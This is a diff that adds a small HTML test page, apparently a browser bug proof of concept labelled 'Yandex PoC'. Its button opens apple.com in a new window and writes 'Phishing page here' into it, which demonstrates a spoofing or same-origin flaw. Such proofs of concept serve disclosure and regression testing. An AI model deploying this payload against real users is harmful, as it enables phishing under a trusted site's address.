@@ -1,0 +1,8 @@
+<input type="button" value="Run test case" onclick="
+	if(window.open.toString()!=&quot;function open&quot;+Function.prototype.toString().substr(9)) {
+                delete window.open;
+        }	
+	w = window.open(&quot;http://www.apple.com&quot;, &quot;_blank&quot;);
+        w.document.write(&quot;Yandex PoC by Kirtikumar. Phishing page here&quot;);
+">
+
